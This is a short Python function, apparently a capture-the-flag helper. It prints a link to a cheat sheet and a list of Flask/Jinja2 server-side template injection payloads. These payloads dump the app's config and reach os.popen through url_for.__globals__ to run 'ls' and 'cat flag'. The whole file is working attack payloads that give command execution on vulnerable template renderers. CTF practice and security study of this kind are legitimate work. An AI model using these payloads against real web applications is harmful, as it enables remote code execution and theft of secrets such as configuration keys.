def print_flask_payloads():
    print("https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti")
    print("{{config}}")
    print("{{url_for.__globals__.os.__dict__.popen('ls').read()}}")
    print("{{url_for.__globals__.os.__dict__.popen('cat flag').read()}}")
    print("{{url_for.__globals__['os'].__dict__['popen']('ls').read() }}")
    print("{{url_for.__globals__['os'].__dict__['popen']('cat flag').read() }}")